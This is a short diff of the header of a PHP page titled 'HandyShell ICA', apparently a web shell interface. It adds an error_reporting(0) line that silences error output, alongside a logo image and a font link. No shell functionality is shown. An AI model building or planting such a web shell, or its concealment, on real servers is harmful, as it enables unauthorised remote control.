@@ -1,5 +1,5 @@
 <title>HandyShell ICA</title>
-
+<?php error_reporting(0); ?>
 <img src="https://1.bp.blogspot.com/-l2aEbrMfVns/V0Qzc6GCqzI/AAAAAAAAB2E/xmVzJ7SDzVYgLh7twkpKsBGd9zz7o3SUwCLcB/s1600/ica.png"><br><br>
 <link href="https://fonts.googleapis.com/css?family=Hammersmith+One|Mogra|Orbitron|Play|Shadows+Into+Light" rel="stylesheet">
 
